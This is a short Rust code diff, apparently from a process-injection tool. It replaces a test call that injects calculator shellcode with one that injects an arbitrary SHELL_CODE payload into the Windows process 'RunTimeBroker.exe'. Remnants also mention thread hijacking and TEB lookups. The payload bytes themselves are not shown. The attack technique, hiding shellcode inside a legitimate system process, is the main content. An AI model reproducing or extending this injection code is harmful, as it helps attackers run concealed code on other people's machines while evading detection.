@@ -1,8 +1,8 @@
 //use noldr::{get_dll_address, get_teb};
-use winapi::um::processthreadsapi::CreateProcessA;
-use winapi::um::processthreadsapi::PROCESS_INFORMATION;
-use winapi::um::processthreadsapi::STARTUPINFOA;
-use winapi::um::winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS};
+//use winapi::um::processthreadsapi::CreateProcessA;
+//use winapi::um::processthreadsapi::PROCESS_INFORMATION;
+//use winapi::um::processthreadsapi::STARTUPINFOA;
+//use winapi::um::winbase::{DEBUG_PROCESS, DETACHED_PROCESS, NORMAL_PRIORITY_CLASS};
 
 mod func;
 
@@ -147,5 +147,9 @@ fn main() {
     println!("Thread hijacked successfully");
     */
 
-    snapinject_rs::inject_calc_shellcode("RunTimeBroker.exe").unwrap();
+    //snapinject_rs::inject_calc_shellcode("RunTimeBroker.exe").unwrap();
+
+    let process_name = "RunTimeBroker.exe".to_string();
+
+    snapinject_rs::inject_shellcode(&process_name, &SHELL_CODE).unwrap();
 }
